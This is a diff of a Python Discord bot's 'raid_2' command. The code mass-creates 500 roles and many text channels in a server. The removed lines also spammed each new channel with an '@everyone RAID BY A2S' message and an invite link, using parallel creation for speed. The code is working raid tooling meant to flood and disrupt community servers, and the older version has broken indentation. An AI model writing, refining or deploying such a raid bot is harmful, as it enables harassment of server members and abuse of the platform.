@@ -76,67 +76,61 @@ async def raid_2(
     except:
         pass
 
+    # =========================
+    # 500 RÔLES
+    # =========================
+    try:
+        for i in range(500):
+            await guild.create_role(name=f"{nom_role}-{i+1}")
+            await asyncio.sleep(0.05)
+    except Exception as e:
+        await interaction.edit_original_response(
+            content=f"❌ Erreur rôles : {e}"
+        )
+        return
 
-# rôles
-try:
-    for i in range(500):
-        await guild.create_role(name=f"{nom_role}-{i+1}")
-        await asyncio.sleep(0.1)
-except Exception as e:
-    await interaction.edit_original_response(
-        content=f"❌ Erreur rôles : {e}"
-    )
-    return
-
+    # =========================
     # catégorie
+    # =========================
     categorie = None
     if categorie_id:
         try:
-            from discord import CategoryChannel
+            categorie = guild.get_channel(int(categorie_id))
+        except:
+            categorie = None
 
-categorie = None
-
-if categorie_id:
-    try:
-        categorie = guild.get_channel(int(categorie_id))
-    except:
+    if not isinstance(categorie, discord.CategoryChannel):
         categorie = None
 
-# vérifie que c'est bien une catégorie
-from discord import CategoryChannel
+    # =========================
+    # création salons + message "bonjour"
+    # =========================
+    try:
+        for i in range(nombre):
+            channel = await guild.create_text_channel(
+                name=f"{nom}-{i+1}",
+                category=categorie
+            )
 
-if not isinstance(categorie, CategoryChannel):
-    categorie = None
-
-    semaphore = asyncio.Semaphore(10)
-
-    async def create_channel(i):
-        async with semaphore:
             try:
-                channel = await guild.create_text_channel(
-                    name=f"{nom}-{i + 1}",
-                    category=categorie
-                )
-                try:
-                    await channel.send(
-                        "@everyone RAID BY A2S https://discord.gg/vWeekH4BCP"
-                    )
-                except:
-                    pass
+                await channel.send("bonjour")
             except:
                 pass
 
-    await asyncio.gather(
-        *[create_channel(i) for i in range(nombre)],
-        return_exceptions=True
-    )
+            await asyncio.sleep(0.1)
+
+    except Exception as e:
+        await interaction.edit_original_response(
+            content=f"❌ Erreur salons : {e}"
+        )
+        return
 
     await interaction.edit_original_response(
         content=(
             f"✅ Terminé !\n"
             f"📌 Serveur : {nom_serveur}\n"
             f"📌 Salons : {nombre}\n"
-            f"📌 Rôles : 5"
+            f"📌 Rôles : 500"
         )
     )
 @bot.command(name="a2s")
